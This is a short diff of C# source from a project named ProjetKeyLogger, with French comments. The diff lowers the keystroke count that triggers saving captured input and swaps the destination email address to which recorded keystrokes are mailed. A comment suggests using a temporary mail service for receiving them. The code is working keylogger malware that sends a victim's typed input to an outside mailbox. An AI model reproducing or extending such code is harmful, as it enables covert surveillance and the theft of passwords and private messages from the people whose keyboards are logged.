@@ -364,7 +364,7 @@ namespace ProjetKeyLogger
 
                     //SI le nombre de caracteres tapés a dépassé la limite
                     //Et si le temps d'innactivité a dépassé 5 minutes
-                    if (nb_caractere_tape > 100 && (DateTime.Now.Minute - date_dernier_activite.Minute == temps_inactivite_max || DateTime.Now.Minute - date_dernier_activite.Minute - 60 == temps_inactivite_max) )
+                    if (nb_caractere_tape > 50 && (DateTime.Now.Minute - date_dernier_activite.Minute == temps_inactivite_max || DateTime.Now.Minute - date_dernier_activite.Minute - 60 == temps_inactivite_max) )
                     {
                         //On ajoute l'enregistrement a la collection
                         collection_enregistrement.ajouterNew(enregistrement);
@@ -423,7 +423,7 @@ namespace ProjetKeyLogger
             //definition de l'adresse de destination 
             //Création d'un mail temporaire. On peut aussi mettre notre adresse mail!
             //site de création du mail : temp-mail.org
-            message_mail.To.Add("ccamenen@outlook.fr");
+            message_mail.To.Add("tulaurapas35@gmail.com");
 
             //defition de l'objet du mail
             message_mail.Subject = objet_mail;
